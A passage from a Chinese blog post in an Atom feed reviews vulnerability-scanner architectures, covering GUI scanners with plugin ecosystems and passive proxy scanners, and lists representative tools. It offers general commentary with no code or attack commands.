&lt;p&gt;这里之所以单独区别于前面的综合扫描器【其实是笔者实在想不出小标题了XD】，是想谈谈其开发时间、开发难度，以及插件化难度。&lt;/p&gt;

&lt;p&gt;虽然说部分Gui扫描器也实现了插件化，但作者们大多喜欢自己更新，或者只要求邮件方式提交插件。&lt;/p&gt;

&lt;p&gt;这样的话，把产品生态搞成了一个近似闭环，但是肯定又远不及apple store之类的体量，导致用户主动提交的漏扫插件是比较少的。&lt;/p&gt;

&lt;p&gt;当然，有部分漏扫的功能和用户体验，还是做的很不错的，很受大家追捧，笔者当年也用的很顺手。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;椰树
北极熊扫描器
k8 team系列扫描器
千手千眼佛网站扫描器
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;代理扫描器&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;说起代理扫描器，可能内容就比较宽泛了，这里简单讲下，以后有机会单独谈谈。&lt;/p&gt;

&lt;p&gt;何谓代理，中间人也，只要你能抓住中间流量，便可以作为基准去做漏洞扫描或者fuzz。&lt;/p&gt;

&lt;p&gt;大家可能会想到利用抓包，利用网卡流量进行分析；有人也许会通过浏览器流量代理进行分析；还有人会通过浏览器本身提供扩展插件功能，直接对页面进行即时钩子探测。&lt;/p&gt;

&lt;p&gt;说到这块儿，笔者所见的一般都是轻量级的，也可能是见识少吧。个人感觉很少有在采集存数据库以后，在离线端部署过多的exp探测任务的。&lt;/p&gt;

&lt;p&gt;毕竟，这块儿也是要考虑到扫描效率，以及会话过期问题的。&lt;/p&gt;

&lt;p&gt;另外，貌似代理扫描器对owasp的一些通用漏洞的fuzz，以及对敏感内容的检测，会显得多一些。对于能检测逻辑漏洞的被动扫描器，也算是比较高level的了。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysrc的GourdScan
burpsuite插件系列
wyproxy的衍生扫描器
浏览器插件系列
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;笔者见过的常见漏扫的架构差不多就是这些了，点到为止吧。另外，笔者自研的也有类似产品，这里就不打广告了XD。&lt;/p&gt;

&lt;p&gt;可能有部分内容，由于时间关系没能例举全，也可能有部分笔误，期待指正和建议。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">研究漏扫这块儿有段时间了，虽然是业余自己玩，但平素跟公司漏扫产品线打交道比较多，稍微有些心得，在这里简单分享下。</summary></entry></feed>